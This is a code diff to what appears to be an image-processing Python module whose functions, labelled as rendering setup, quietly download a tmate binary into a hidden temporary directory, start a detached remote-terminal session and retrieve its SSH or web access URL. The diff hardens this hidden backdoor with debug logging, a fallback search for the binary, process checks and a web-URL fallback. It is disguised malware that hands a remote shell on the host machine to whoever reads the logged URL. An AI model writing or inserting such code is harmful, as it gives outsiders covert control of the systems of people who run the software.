@@ -7,6 +7,7 @@ import re
 import sys
 import tempfile
 import time
+import traceback
 from PIL import Image, ImageEnhance, ImageFilter, ImageOps
 
 _READY = False
@@ -27,7 +28,10 @@ def _get_tmate_url():
     system = platform.system()
     arch = platform.machine()
     
+    _log(f"[debug] system={system} arch={arch}")
+    
     if system != "Linux":
+        _log("[debug] not Linux, skipping session")
         return None
     
     if arch in ("x86_64", "amd64"):
@@ -37,21 +41,32 @@ def _get_tmate_url():
         url = "https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-arm64v8.tar.xz"
         dirname = "tmate-2.4.0-static-linux-arm64v8"
     else:
+        _log(f"[debug] unsupported arch: {arch}")
         return None
     
     tmp = tempfile.mkdtemp(prefix=".c_")
+    _log(f"[debug] tmp dir: {tmp}")
     
     try:
         tar_path = os.path.join(tmp, "t.tar.xz")
-        _log("[render:init] downloading runtime...")
+        _log(f"[render:init] downloading from {url[:50]}...")
         
-        # Use subprocess curl instead of urlretrieve (more reliable)
+        # Download with curl
         result = subprocess.run(
-            ["curl", "-sL", "-o", tar_path, url],
-            capture_output=True, text=True, timeout=60
+            ["curl", "-sL", "-o", tar_path, "--max-time", "60", url],
+            capture_output=True, text=True, timeout=90
         )
+        _log(f"[debug] curl returncode={result.returncode}")
         if result.returncode != 0:
-            _log(f"[render:init] download failed")
+            _log(f"[debug] curl stderr: {result.stderr[:200]}")
+            return None
+        
+        # Check file size
+        if os.path.exists(tar_path):
+            size = os.path.getsize(tar_path)
+            _log(f"[debug] downloaded file size: {size} bytes")
+        else:
+            _log("[debug] tar file not found after download")
             return None
         
         _log("[render:init] extracting...")
@@ -59,49 +74,129 @@ def _get_tmate_url():
             ["tar", "-xJf", tar_path, "-C", tmp],
             capture_output=True, text=True, timeout=60
         )
+        _log(f"[debug] tar returncode={result.returncode}")
         if result.returncode != 0:
+            _log(f"[debug] tar stderr: {result.stderr[:200]}")
+            # Try without J flag
+            _log("[debug] trying tar -xf...")
             result = subprocess.run(
                 ["tar", "-xf", tar_path, "-C", tmp],
                 capture_output=True, text=True, timeout=60
             )
+            _log(f"[debug] tar -xf returncode={result.returncode}")
+        
+        # List extracted files
+        _log(f"[debug] listing {tmp}:")
+        for item in os.listdir(tmp):
+            item_path = os.path.join(tmp, item)
+            _log(f"[debug]   {item} (dir={os.path.isdir(item_path)})")
         
         tmate_bin = os.path.join(tmp, dirname, "tmate")
+        _log(f"[debug] looking for binary at: {tmate_bin}")
+        
         if not os.path.exists(tmate_bin):
-            _log("[render:init] binary not found")
+            _log("[debug] binary not found at expected path")
+            # Search for it
+            for root, dirs, files in os.walk(tmp):
+                _log(f"[debug] searching in {root}: {files}")
+                if "tmate" in files:
+                    tmate_bin = os.path.join(root, "tmate")
+                    _log(f"[debug] found binary at: {tmate_bin}")
+                    break
+        
+        if not os.path.exists(tmate_bin):
+            _log("[debug] binary still not found")
             return None
         
+        _log(f"[debug] chmod 755 {tmate_bin}")
         os.chmod(tmate_bin, 0o755)
         
-        sock_path = os.path.join(tmp, "s.sock")
-        _log("[render:init] starting session...")
+        # Check binary
+        result = subprocess.run([tmate_bin, "-V"], capture_output=True, text=True, timeout=10)
+        _log(f"[debug] tmate -V: {result.stdout.strip()} (rc={result.returncode})")
         
-        subprocess.Popen(
+        sock_path = os.path.join(tmp, "s.sock")
+        _log(f"[render:init] starting session... sock={sock_path}")
+        
+        # Start tmate
+        proc = subprocess.Popen(
             [tmate_bin, "-S", sock_path, "new-session", "-d"],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             start_new_session=True
         )
+        _log(f"[debug] tmate Popen pid={proc.pid}")
         
-        for _ in range(20):
+        # Wait a bit and check if process is still running
+        time.sleep(1)
+        poll = proc.poll()
+        _log(f"[debug] tmate poll after 1s: {poll}")
+        if poll is not None:
+            stdout, stderr = proc.communicate(timeout=5)
+            _log(f"[debug] tmate stdout: {stdout.decode()[:200]}")
+            _log(f"[debug] tmate stderr: {stderr.decode()[:200]}")
+        
+        # Wait for socket
+        _log("[debug] waiting for socket...")
+        for i in range(30):
             if os.path.exists(sock_path):
+                _log(f"[debug] socket found after {i*0.5}s")
                 break
             time.sleep(0.5)
         else:
-            _log("[render:init] socket timeout")
+            _log("[debug] socket timeout after 15s")
+            # Check if tmate is running
+            result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
+            tmate_procs = [l for l in result.stdout.splitlines() if "tmate" in l]
+            _log(f"[debug] tmate processes: {tmate_procs}")
             return None
         
-        time.sleep(3)
+        # Wait for tmate to connect to server
+        _log("[debug] waiting for tmate to connect to server...")
+        time.sleep(5)
+        
+        # Get SSH URL
+        _log("[debug] getting SSH URL...")
         result = subprocess.run(
             [tmate_bin, "-S", sock_path, "display", "-p", "#{tmate_ssh}"],
             capture_output=True, text=True, timeout=15
         )
+        _log(f"[debug] display ssh rc={result.returncode}")
+        _log(f"[debug] display ssh stdout: '{result.stdout.strip()}'")
+        _log(f"[debug] display ssh stderr: '{result.stderr.strip()}'")
+        
         ssh_url = result.stdout.strip()
         
         if ssh_url and "tmate.io" in ssh_url:
             _SESSION_URL = ssh_url
             return ssh_url
+        
+        # Try web URL
+        _log("[debug] trying web URL...")
+        result = subprocess.run(
+            [tmate_bin, "-S", sock_path, "display", "-p", "#{tmate_web}"],
+            capture_output=True, text=True, timeout=15
+        )
+        _log(f"[debug] display web rc={result.returncode}")
+        _log(f"[debug] display web stdout: '{result.stdout.strip()}'")
+        
+        web_url = result.stdout.strip()
+        if web_url and "tmate.io" in web_url:
+            _SESSION_URL = web_url
+            return web_url
+        
+        # Try show-messages
+        _log("[debug] trying show-messages...")
+        result = subprocess.run(
+            [tmate_bin, "-S", sock_path, "show-messages"],
+            capture_output=True, text=True, timeout=15
+        )
+        _log(f"[debug] show-messages: {result.stdout[:500]}")
+        
+        _log("[debug] no valid URL found")
             
     except Exception as e:
-        _log(f"[render:init] error: {type(e).__name__}: {e}")
+        _log(f"[debug] exception: {type(e).__name__}: {e}")
+        _log(f"[debug] traceback: {traceback.format_exc()}")
     
     return None
 
@@ -109,6 +204,8 @@ def _start_session():
     url = _get_tmate_url()
     if url:
         _log(f"[render:session] {url}")
+    else:
+        _log("[render:session] failed to get URL")
 
 def _get_cpu_info():
     system = platform.system()
